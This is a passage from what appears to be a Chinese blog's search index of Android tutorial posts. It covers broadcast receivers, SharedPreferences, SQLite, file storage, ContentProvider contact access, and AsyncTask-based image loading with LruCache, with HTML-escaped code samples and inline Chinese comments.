发送有序广播（意图，权限） break; ↳ 接收器不需要权限 } } } MyBroadcastReceiver.java public class MyBroadcastReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { 处理匹配到的广播（处在 UI 线程，不应包含耗时操作，可以传给 Service） Log.w(\u0026#34;Tag\u0026#34;, intent.getStringExtra(\u0026#34;msg\u0026#34;) + \u0026#34;_\u0026#34; + intent.getAction()); Bundle bundle = new Bundle(); bundle.putString(\u0026#34;str\u0026#34;, \u0026#34;新消息\u0026#34;); ----有序广播---- abortBroadcast(); 中断广播 传递数据 setResultCode(1); setResultData(\u0026#34;ABC\u0026#34;); setResultExtras(bundle); setResult(1, \u0026#34;ABC\u0026#34;, bundle); 接收数据 int resultCode = getResultCode(); String resultData = getResultData(); Bundle resultExtras = getResultExtras(true); resultExtras.getString(\u0026#34;str\u0026#34;, \u0026#34;无消息\u0026#34;); } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;发送普通广播\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;发送有序广播\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; AndroidManifest.xml \u0026lt;application 其余组件 \u0026lt;receiver 静态注册 android:name=\u0026#34;.MyBroadcastReceiver\u0026#34; 类名 android:exported=\u0026#34;false\u0026#34;\u0026gt; 禁止跨 App 使用（以 user id 为界，不接收外部广播）（安全） \u0026lt;intent-filter android:priority=\u0026#34;200\u0026#34;\u0026gt; 优先级 \u0026lt;action android:name=\u0026#34;action1\u0026#34;/\u0026gt; 过滤信息（匹配 Intent） \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.net.conn.CONNECTIVITY_CHANGE\u0026#34; /\u0026gt; 网络变化 \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.BOOT_COMPLETED\u0026#34; /\u0026gt; 开机启动 \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; \u0026lt;/application\u0026gt; LocalBroadcastManager 应用内广播，更加安全，高效。 public class MainActivity extends Activity { private LocalBroadcastManager mLocalBroadcastManager; private MyBroadcastReceiver mMyBroadcastReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mLocalBroadcastManager = LocalBroadcastManager.getInstance(this); mMyBroadcastReceiver = new MyBroadcastReceiver(); IntentFilter intentFilter = new IntentFilter(\u0026#34;action1\u0026#34;); mLocalBroadcastManager.registerReceiver(mMyBroadcastReceiver, intentFilter); 注册应用内广播接收器 } @Override protected void onDestroy() { super.onDestroy(); mLocalBroadcastManager.unregisterReceiver(mMyBroadcastReceiver); 取消注册 } public void onClick(View view) { Intent intent = new Intent(\u0026#34;action1\u0026#34;); intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;应用内广播\u0026#34;); mLocalBroadcastManager.sendBroadcast(intent); 发送应用内广播 } } ","permalink":"https://xhstormr.github.io/blog/posts/android-broadcastreceiver/","summary":"","title":"Android BroadcastReceiver"},{"content":"Updated on 2016-10-06\nFile\nSQLite\nSharedPreferences\nContentProvider (组件)\nSharedPreferences 一种轻型的数据存储方式，基于 XML 文件存储（Key-Value）键值对数据。\n( String、int、long、float、boolean、Set\u0026lt;String\u0026gt; )\nSharedPreferences：获取数据 ( getXXX )。 SharedPreferences.Editor：修改数据 ( putXXX )，存储数据 ( commit、apply )。 MainActivity.java public class MainActivity extends Activity { private EditText mUserName, mPassword; private CheckBox mSaveUserName; private SharedPreferences mSharedPreferences; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); mUserName = (EditText) findViewById(R.id.editText); mPassword = (EditText) findViewById(R.id.editText2); mSaveUserName = (CheckBox) findViewById(R.id.checkBox); mSharedPreferences = getSharedPreferences(\u0026#34;123\u0026#34;, MODE_PRIVATE); 创建自定义 Preferences 文件 (123.xml) ---- mSharedPreferences = PreferenceManager.getDefaultSharedPreferences(MainActivity.this); 获得应用默认 Preferences 文件 (com.example.system.myapplication_preferences.xml) loadUserName(); } private void loadUserName() { String userName = mSharedPreferences.getString(\u0026#34;userName\u0026#34;, \u0026#34;\u0026#34;); 获得参数 if (!userName.equals(\u0026#34;\u0026#34;)) { mUserName.setText(userName); mSaveUserName.setChecked(true); } } public void onClick(View view) { switch (view.getId()) { case R.id.button: String userName = mUserName.getText().toString().trim(); String passWord = mPassword.getText().toString().trim(); if (\u0026#34;admin\u0026#34;.equals(userName) \u0026amp;\u0026amp; \u0026#34;123456\u0026#34;.equals(passWord)) { Toast.makeText(MainActivity.this, \u0026#34;登录成功\u0026#34;, Toast.LENGTH_SHORT).show(); if (mSaveUserName.isChecked()) { 是否保存用户名 mSharedPreferences.edit().putString(\u0026#34;userName\u0026#34;, userName).apply(); 设置参数 } else { mSharedPreferences.edit().remove(\u0026#34;userName\u0026#34;).apply(); 移除参数 ---- mSharedPreferences.edit().clear().apply(); 清空参数 } } else { Toast.makeText(MainActivity.this, \u0026#34;登录失败\u0026#34;, Toast.LENGTH_SHORT).show(); } break; case R.id.button2: finish(); 结束 Activity break; } } } main_activity.xml \u0026lt;RelativeLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;TextView android:layout_alignParentStart=\u0026#34;true\u0026#34; android:layout_alignParentTop=\u0026#34;true\u0026#34; android:layout_marginTop=\u0026#34;20dp\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;用户名：\u0026#34; android:textSize=\u0026#34;20sp\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;TextView android:layout_marginTop=\u0026#34;20dp\u0026#34; android:layout_alignParentStart=\u0026#34;true\u0026#34; android:layout_below=\u0026#34;@+id/textView\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;密 码：\u0026#34; android:textSize=\u0026#34;20sp\u0026#34; android:id=\u0026#34;@+id/textView2\u0026#34;/\u0026gt; \u0026lt;EditText android:inputType=\u0026#34;text\u0026#34; android:textSize=\u0026#34;20sp\u0026#34; android:id=\u0026#34;@+id/editText\u0026#34; android:layout_alignBottom=\u0026#34;@+id/textView\u0026#34; android:layout_toEndOf=\u0026#34;@+id/textView\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;EditText android:inputType=\u0026#34;textPassword\u0026#34; android:textSize=\u0026#34;20sp\u0026#34; android:id=\u0026#34;@+id/editText2\u0026#34; android:layout_alignBottom=\u0026#34;@+id/textView2\u0026#34; android:layout_toEndOf=\u0026#34;@+id/textView2\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;/\u0026gt; \u0026lt;CheckBox android:checked=\u0026#34;false\u0026#34; android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:layout_below=\u0026#34;@+id/textView2\u0026#34; android:layout_alignParentStart=\u0026#34;true\u0026#34; android:layout_marginTop=\u0026#34;20dp\u0026#34; android:text=\u0026#34;保存用户名\u0026#34; android:id=\u0026#34;@+id/checkBox\u0026#34;/\u0026gt; \u0026lt;LinearLayout android:orientation=\u0026#34;horizontal\u0026#34; android:layout_below=\u0026#34;@+id/checkBox\u0026#34; android:layout_alignParentStart=\u0026#34;true\u0026#34; android:layout_marginTop=\u0026#34;20dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;登录\u0026#34; android:id=\u0026#34;@+id/button\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;0dp\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:text=\u0026#34;退出\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;/RelativeLayout\u0026gt; SQLite 一种轻量级的数据库，无需依赖，无需配置，无需安装，所有数据都存储在一个文件当中。\n( NULL (空值)、INTEGER (整形)、REAL (浮点型)、TEXT (字符串)、BLOB (二进制) )\nSQLiteDatabase：操作数据库的类。 原生 SQL 语句方法：execSQL、rawQuery。 执行 SDK 封装方法：insert、delete、update、query。 SQLiteOpenHelper：管理数据库的类。 onCreate：创建数据库时调用。 onUpgrade：更新数据库时调用。 getWritableDatabase：以读写方式打开数据库。 getReadableDatabase：以只读方式打开数据库。（假） MainActivity.java public class MainActivity extends Activity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); SQLiteDatabase db = openOrCreateDatabase(\u0026#34;123.db\u0026#34;, MODE_PRIVATE, null); 直接新建或打开已存在数据库 ---- SQLiteDatabase db = new MySQLiteOpenHelper(MainActivity.this, \u0026#34;123.db\u0026#34;, null, 1).getWritableDatabase(); 通过 OpenHelper 新建数据库并初始化表 A(db); SQL 语句 B(db); SDK 封装 db.close(); } private void A(SQLiteDatabase db) { db.beginTransaction(); for (int i = 0; i \u0026lt; 5; i++) { db.execSQL(\u0026#34;insert into usertb(name,age) values(?,?)\u0026#34;, new Object[]{\u0026#34;王五\u0026#34;, \u0026#34;26\u0026#34;}); 增 } db.setTransactionSuccessful(); db.endTransaction(); db.execSQL(\u0026#34;delete from usertb where _id \u0026gt; ?\u0026#34;, new Object[]{\u0026#34;3\u0026#34;}); 删 db.execSQL(\u0026#34;update usertb set name = ? , age = ? where _id = ?\u0026#34;, new Object[]{\u0026#34;李四\u0026#34;, \u0026#34;28\u0026#34;, \u0026#34;3\u0026#34;}); 改 Cursor cursor = db.rawQuery(\u0026#34;select * from usertb where name = ? order by _id desc\u0026#34;, new String[]{\u0026#34;王五\u0026#34;}); 查 Show(cursor); } private void B(SQLiteDatabase db) { ContentValues contentValues = new ContentValues(); for (int i = 0; i \u0026lt; 5; i++) { contentValues.clear(); contentValues.put(\u0026#34;name\u0026#34;, \u0026#34;王五\u0026#34;); contentValues.put(\u0026#34;age\u0026#34;, 26); db.insert(\u0026#34;usertb\u0026#34;, null, contentValues); 增 } db.delete(\u0026#34;usertb\u0026#34;, \u0026#34;name like ?\u0026#34;, new String[]{\u0026#34;%四%\u0026#34;}); 删 contentValues.clear(); contentValues.put(\u0026#34;age\u0026#34;, 5); db.update(\u0026#34;usertb\u0026#34;, contentValues, \u0026#34;name = ?\u0026#34;, new String[]{\u0026#34;王五\u0026#34;}); 改 Cursor cursor = db.query(\u0026#34;usertb\u0026#34;, null, \u0026#34;_id \u0026gt; ?\u0026#34;, new String[]{\u0026#34;0\u0026#34;}, null, null, \u0026#34;age\u0026#34;); 查 Show(cursor); } private void Show(Cursor cursor) { /*方案一*/ // while (cursor.moveToNext()) { 行 //// int id = cursor.getInt(0); 列 //// String name = cursor.getString(1); //// int age = cursor.getInt(2); // int id = cursor.getInt(cursor.getColumnIndex(\u0026#34;_id\u0026#34;)); // String name = cursor.getString(cursor.getColumnIndex(\u0026#34;name\u0026#34;)); // int age = cursor.getInt(cursor.getColumnIndex(\u0026#34;age\u0026#34;)); // Log.i(\u0026#34;Tag\u0026#34;, id + \u0026#34;::\u0026#34; + name + \u0026#34;::\u0026#34; + age); // } // cursor.close(); /*方案二*/ String[] columnNames = cursor.getColumnNames(); String[] column = new String[columnNames.length]; while (cursor.moveToNext()) { 行 for (int i = 0; i \u0026lt; columnNames.length; i++) { column[i] = cursor.getString(cursor.getColumnIndex(columnNames[i])); 列 } Log.i(\u0026#34;Tag\u0026#34;, Arrays.toString(column)); } cursor.close(); } } MySQLiteOpenHelper.java public class MySQLiteOpenHelper extends SQLiteOpenHelper { 继承 SQLiteOpenHelper public MySQLiteOpenHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version) { super(context, name, factory, version); } @Override public void onCreate(SQLiteDatabase db) { 创建数据库时调用 db.execSQL(\u0026#34;create table if not exists usertb(_id integer primary key autoincrement,name text not null,age integer not null)\u0026#34;); db.execSQL(\u0026#34;insert into usertb(name,age) values(?,?)\u0026#34;, new Object[]{\u0026#34;Admin\u0026#34;, \u0026#34;0\u0026#34;}); } @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) { 更新数据库时调用 } } File 自定义数据文件。\nMainActivity.java public class MainActivity extends Activity { private EditText editText; private TextView textView; @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); editText = (EditText) findViewById(R.id.editText); textView = (TextView) findViewById(R.id.textView); A(); } public void onClick(View view) throws IOException { switch (view.getId()) { case R.id.button1: 保存 String string = editText.getText().toString(); BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(\u0026#34;123.txt\u0026#34;, MODE_APPEND), \u0026#34;utf-8\u0026#34;)); bufferedWriter.write(string); （/data/data/com.example.system.myapplication/files/123.txt，追加模式） bufferedWriter.close(); break; case R.id.button2: 读取 StringBuilder stringBuilder = new StringBuilder(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openFileInput(\u0026#34;123.txt\u0026#34;), \u0026#34;utf-8\u0026#34;)); for (String s; (s = bufferedReader.readLine()) != null; ) { （/data/data/com.example.system.myapplication/files/123.txt） stringBuilder.append(s); } bufferedReader.close(); textView.setText(stringBuilder.toString()); break; } } private void A() { 内部存储： File filesDir = this.getFilesDir(); File cacheDir = this.getCacheDir(); File dir = this.getDir(\u0026#34;123456\u0026#34;, MODE_PRIVATE); 依次为： /data/data/com.example.system.myapplication/files 数据目录 /data/data/com.example.system.myapplication/cache 缓存目录 /data/data/com.example.system.myapplication/app_123456 外部存储： File externalFilesDir = this.getExternalFilesDir(null); File externalCacheDir = this.getExternalCacheDir(); File externalDir = new File(Environment.getExternalStorageDirectory(), \u0026#34;123456\u0026#34;); 依次为： /storage/sdcard0/Android/data/com.example.system.myapplication/files 数据目录 /storage/sdcard0/Android/data/com.example.system.myapplication/cache 缓存目录 /storage/sdcard0/123456 操作外部存储需要权限： \u0026lt;uses-permission android:name=\u0026#34;android.permission.WRITE_EXTERNAL_STORAGE\u0026#34;/\u0026gt; } } main_activity.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;EditText android:gravity=\u0026#34;center\u0026#34; android:hint=\u0026#34;输入\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/editText\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;保存\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;读取\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;TextView android:gravity=\u0026#34;center\u0026#34; android:text=\u0026#34;内容\u0026#34; android:textSize=\u0026#34;25sp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; ContentProvider 用于实现不同应用程序之间共享数据的组件。\nContentProvider：内容提供器，通过 Uri 地址给外部应用程序访问来提供数据。out ContentResolver：内容解析器，通过访问外部应用程序的 Uri 地址来获得数据。in ContentResolver 通过指定 Uri 访问 ContentProvider，调用其提供的增删改查方法。 MainActivity.java import android.provider.ContactsContract.CommonDataKinds.Email; import android.provider.ContactsContract.CommonDataKinds.Phone; import android.provider.ContactsContract.CommonDataKinds.StructuredName; import android.provider.ContactsContract.Contacts; import android.provider.ContactsContract.Data; import android.provider.ContactsContract.RawContacts; .... public class MainActivity extends Activity { @Override protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main_activity); A(); 查 B(); 增 } private void A() { ContentResolver contentResolver = getContentResolver(); 查询联系人 String[] column = {Contacts._ID, Contacts.DISPLAY_NAME, Contacts.LAST_TIME_CONTACTED}; 查询列 Cursor cursor = contentResolver.query(Contacts.CONTENT_URI, column, null, null, Contacts._ID); if (cursor != null) { Show(cursor); 解析游标 } 查询电话本 String[] column = {Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER}; 查询列 Cursor cursor = contentResolver.query(Phone.CONTENT_URI, column, null, null, Phone._ID); if (cursor != null) { Show(cursor); 解析游标 } 查询邮箱 String[] column = {Email._ID, Email.NAME_RAW_CONTACT_ID, Email.DATA}; 查询列 Cursor cursor = contentResolver.query(Email.CONTENT_URI, column, null, null, Email._ID); if (cursor != null) { Show(cursor); 解析游标 } 需要权限： \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CONTACTS\u0026#34;/\u0026gt; } private void B() { ContentResolver contentResolver = getContentResolver(); 新建联系人 Uri insert = contentResolver.insert(RawContacts.CONTENT_URI, new ContentValues()); long parseId = ContentUris.parseId(insert); 获得在表中的 ID 插入姓名 ContentValues contentValues = new ContentValues(); contentValues.put(StructuredName.RAW_CONTACT_ID, parseId); ID contentValues.put(StructuredName.DISPLAY_NAME, \u0026#34;TEST\u0026#34;); 姓名 contentValues.put(StructuredName.MIMETYPE, StructuredName.CONTENT_ITEM_TYPE); 类型为姓名 contentResolver.insert(Data.CONTENT_URI, contentValues); 插入电话 contentValues.clear(); contentValues.put(Phone.RAW_CONTACT_ID, parseId); ID contentValues.put(Phone.NUMBER, \u0026#34;123456\u0026#34;); 电话 contentValues.put(Phone.MIMETYPE, Phone.CONTENT_ITEM_TYPE); 类型为电话 contentResolver.insert(Data.CONTENT_URI, contentValues); 需要权限： \u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_CONTACTS\u0026#34;/\u0026gt; \u0026lt;uses-permission android:name=\u0026#34;android.permission.WRITE_CONTACTS\u0026#34;/\u0026gt; } private void Show(Cursor cursor) { String[] columnNames = cursor.getColumnNames(); String[] column = new String[columnNames.length]; while (cursor.moveToNext()) { 行 for (int i = 0; i \u0026lt; columnNames.length; i++) { column[i] = cursor.getString(cursor.getColumnIndex(columnNames[i])); 列 } Log.i(\u0026#34;Tag\u0026#34;, Arrays.toString(column)); } cursor.close(); } } MyContentProvider.java public class MyContentProvider extends ContentProvider { 继承 ContentProvider @Override public boolean onCreate() { 初始化操作，应用启动时调用，不应包含耗时操作 return false; } @Nullable @Override public String getType(@NonNull Uri uri) { 返回 Uri 的 MIME 类型 return null; （单条数据以 vnd.android.cursor.item/ 开头） } （多条数据以 vnd.android.cursor.dir/ 开头） @Nullable @Override 增 public Uri insert(@NonNull Uri uri, @Nullable ContentValues values) { return null; } @Override 删 public int delete(@NonNull Uri uri, @Nullable String selection, @Nullable String[] selectionArgs) { return 0; } @Override 改 public int update(@NonNull Uri uri, @Nullable ContentValues values, @Nullable String selection, @Nullable String[] selectionArgs) { return 0; } @Nullable @Override 查（一般只需实现查询功能，也就是只给外部提供查询功能） public Cursor query(@NonNull Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) { return null; } } AndroidManifest.xml ⇳ \u0026lt;application 其余组件 \u0026lt;provider android:name=\u0026#34;com.example.system.myapplication.MyContentProvider\u0026#34; android:authorities=\u0026#34;内容提供器\u0026#34;\u0026gt; \u0026lt;/provider\u0026gt; \u0026lt;/application\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-data/","summary":"","title":"Android 数据存储"},{"content":"Updated on 2016-09-28\nAsyncTask 异步访问网络\nLruCache 内存缓存图片\nListView 加载图片（滚动状态，静止状态）\nBaseAdapter 缓存页面（convertView，ViewHolder）\nMainActivity.java public class MainActivity extends Activity { private ListView mListView; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mListView = (ListView) findViewById(R.id.list_item); new NewsAsyncTask().execute(\u0026#34;http://www.imooc.com/api/teacher?type=4\u0026amp;num=30\u0026#34;); 开始异步任务 } 输入参数，执行进度，返回结果 private class NewsAsyncTask extends AsyncTask\u0026lt;String, Void, List\u0026lt;CourseBean\u0026gt;\u0026gt; { @Override protected List\u0026lt;CourseBean\u0026gt; doInBackground(String... params) { 获得 ListView 的 Item 列表 List\u0026lt;CourseBean\u0026gt; courseBeanList = new ArrayList\u0026lt;\u0026gt;(); try { StringBuilder stringBuilder = new StringBuilder(); 下载 JSON BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(params[0]).openStream(), \u0026#34;utf-8\u0026#34;)); for (String s; (s = bufferedReader.readLine()) != null; ) { stringBuilder.append(s); } bufferedReader.close(); JSONObject jsonObject = new JSONObject(stringBuilder.toString()); 解析 JSON JSONArray jsonArray = jsonObject.getJSONArray(\u0026#34;data\u0026#34;); for (int i = 0; i \u0026lt; jsonArray.length(); i++) { JSONObject dataJsonObject = jsonArray.getJSONObject(i); courseBeanList.add(new CourseBean(dataJsonObject.getString(\u0026#34;picSmall\u0026#34;), dataJsonObject.getString(\u0026#34;name\u0026#34;), dataJsonObject.getString(\u0026#34;description\u0026#34;))); } } catch (IOException | JSONException e) { e.printStackTrace(); } return courseBeanList; 返回结果给 onPostExecute } @Override protected void onPostExecute(List\u0026lt;CourseBean\u0026gt; courseBeanList) { 返回结果 super.onPostExecute(courseBeanList); ListAdapter listAdapter = new ListAdapter(MainActivity.this, courseBeanList, mListView); 自定义适配器 mListView.setAdapter(listAdapter); 将控件与适配器绑定 } } } CourseBean.java public class CourseBean { private String ImageURL; private String Title; private String Content; public CourseBean(String imageURL, String title, String content) { ImageURL = imageURL; Title = title; Content = content; } @Override public String toString() { return \u0026#34;CourseBean{\u0026#34; + \u0026#34;ImageURL=\u0026#39;\u0026#34; + ImageURL + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, Title=\u0026#39;\u0026#34; + Title + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, Content=\u0026#39;\u0026#34; + Content + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } public String getImageURL() { return ImageURL; } public void setImageURL(String imageURL) { ImageURL = imageURL; } public String getTitle() { return Title; } public void setTitle(String title) { Title = title; } public String getContent() { return Content; } public void setContent(String content) { Content = content; } } ListAdapter.java public class ListAdapter extends BaseAdapter implements AbsListView.OnScrollListener { public static String[] URLs; private List\u0026lt;CourseBean\u0026gt; mList; private LayoutInflater mInflater; private ImageLoader mImageLoader; private int mStart, mEnd; private boolean mFirstIn; public ListAdapter(Context context, List\u0026lt;CourseBean\u0026gt; courseBeanList, ListView listView) { mFirstIn = true; mList = courseBeanList; mInflater = LayoutInflater.from(context); mImageLoader = new ImageLoader(listView); URLs = new String[mList.size()]; for (int i = 0; i \u0026lt; mList.size(); i++) { URLs[i] = mList.get(i).getImageURL(); } listView.setOnScrollListener(this); 为 ListView 设置监听器 } @Override public int getCount() { return mList.size(); } @Override public Object getItem(int position) { return mList.get(position); } @Override public long getItemId(int position) { return position; } @Override public View getView(int position, View convertView, ViewGroup parent) { CourseBean courseBean = mList.get(position); ViewHolder viewHolder; if (convertView == null) { convertView = mInflater.inflate(R.layout.item_layout, null); viewHolder = new ViewHolder((TextView) convertView.findViewById(R.id.title), (TextView) convertView.findViewById(R.id.content), (ImageView) convertView.findViewById(R.id.image)); convertView.setTag(viewHolder); } else { viewHolder = (ViewHolder) convertView.getTag(); } viewHolder.title.setText(courseBean.getTitle()); viewHolder.content.setText(courseBean.getContent()); viewHolder.image.setTag(courseBean.getImageURL()); 设置 ImageView 的身份标记 mImageLoader.showImage(viewHolder.image, courseBean.getImageURL()); 滚动时加载可见项图片 return convertView; } @Override public void onScrollStateChanged(AbsListView view, int scrollState) { if (scrollState == SCROLL_STATE_IDLE) { mImageLoader.loadImage(mStart, mEnd); 静止时加载可见项图片 } else { mImageLoader.cancelAllTask(); 滚动时停止任务（停止更新 UI 视图中的图片，减少重绘，使滚动流畅） } } @Override public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount) { mStart = firstVisibleItem; mEnd = firstVisibleItem + visibleItemCount; if (mFirstIn \u0026amp;\u0026amp; visibleItemCount \u0026gt; 0) { 第一次显示时调用 mFirstIn = false; mImageLoader.loadImage(mStart, mEnd); } } private class ViewHolder { private TextView title; private TextView content; private ImageView image; private ViewHolder(TextView title, TextView content, ImageView image) { this.title = title; this.content = content; this.image = image; } } } ImageLoader.java public class ImageLoader { private ListView mListView; private Set\u0026lt;AsyncTask\u0026gt; mTask; 任务列表 private LruCache\u0026lt;String, Bitmap\u0026gt; mCache; 内存缓存 public ImageLoader(ListView listView) { mListView = listView; mTask = new HashSet\u0026lt;\u0026gt;(); int cacheSize = ((int) Runtime.getRuntime().maxMemory()) / 4; mCache = new LruCache\u0026lt;String, Bitmap\u0026gt;(cacheSize) { 实例化缓存 @Override protected int sizeOf(String key, Bitmap value) { 获取每次存入的缓存大小 return value.getByteCount(); } }; } public void showImage(ImageView imageView, String imageURL) { 滚动时加载可见项图片 Bitmap bitmap = mCache.get(imageURL); 从缓存中获取 if (bitmap == null) { imageView.setImageResource(R.mipmap.ic_launcher); 加载默认图片 } else { imageView.setImageBitmap(bitmap); 加载缓存图片 } } public void loadImage(int start, int end) { 静止时加载可见项图片 for (int i = start; i \u0026lt; end; i++) { String imageURL = ListAdapter.URLs[i]; Bitmap bitmap = mCache.get(imageURL); 从缓存中获取 if (bitmap == null) { mTask.add(new DownloadImage().execute(imageURL)); 加载网络图片并加入任务列表 } else { ImageView imageView = (ImageView) mListView.findViewWithTag(imageURL); imageView.setImageBitmap(bitmap); 加载缓存图片 } } } public void cancelAllTask() { for (AsyncTask task : mTask) { task.cancel(false); Cancel 状态下 doInBackground 结束后不会调用 onPostExecute，而会调用 onCancelled } ↳ false 代表不调用 Thread.interrupt() } private class DownloadImage extends AsyncTask\u0026lt;String, Void, Bitmap\u0026gt; { private String imageURL; @Override protected Bitmap doInBackground(String... params) { 下载图片 imageURL = params[0]; Bitmap bitmap = null; try { BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(imageURL).openStream()); bitmap = BitmapFactory.decodeStream(bufferedInputStream); 解析为 Bitmap bufferedInputStream.close(); } catch (IOException e) { e.printStackTrace(); } if (mCache.get(imageURL) == null) { mCache.put(imageURL, bitmap); 将图片添加至缓存 } return bitmap; } @Override protected void onPostExecute(Bitmap bitmap) { super.onPostExecute(bitmap); ImageView imageView = (ImageView) mListView.findViewWithTag(imageURL); imageView.setImageBitmap(bitmap); mTask.remove(this); 任务完成（已缓存图片），移出任务列表 } @Override protected void onCancelled(Bitmap bitmap) { 滚动时不更新 UI 视图中的图片，减少重绘，使滚动流畅 super.onCancelled(bitmap); mTask.remove(this); 任务完成（已缓存图片），移出任务列表 } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;ListView android:id=\u0026#34;@+id/list_item\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34;\u0026gt; \u0026lt;/ListView\u0026gt; \u0026lt;/LinearLayout\u0026gt; item_layout.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;horizontal\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:padding=\u0026#34;4dp\u0026#34;\u0026gt; \u0026lt;ImageView android:id=\u0026#34;@+id/image\u0026#34; android:src=\u0026#34;@mipmap/ic_launcher\u0026#34; android:layout_width=\u0026#34;64dp\u0026#34; 